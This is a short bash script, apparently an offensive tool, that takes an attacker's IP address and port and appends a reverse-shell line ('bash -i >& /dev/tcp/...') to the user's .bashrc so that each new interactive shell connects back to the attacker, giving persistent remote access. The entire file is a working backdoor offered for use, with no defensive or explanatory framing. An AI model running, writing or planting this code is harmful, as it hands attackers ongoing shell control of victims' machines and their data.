#!/bin/bash
# bashrc_backdoor.sh - Add a reverse shell command to .bashrc for persistence.
if [ -z "$1" ] || [ -z "$2" ]; then
   echo "Usage: $0 <attacker_ip> <attacker_port>"
   exit 1
fi
echo "Adding reverse shell to .bashrc for persistence..."
echo "bash -i >& /dev/tcp/$1/$2 0>&1" >> $HOME/.bashrc
echo "Backdoor added."
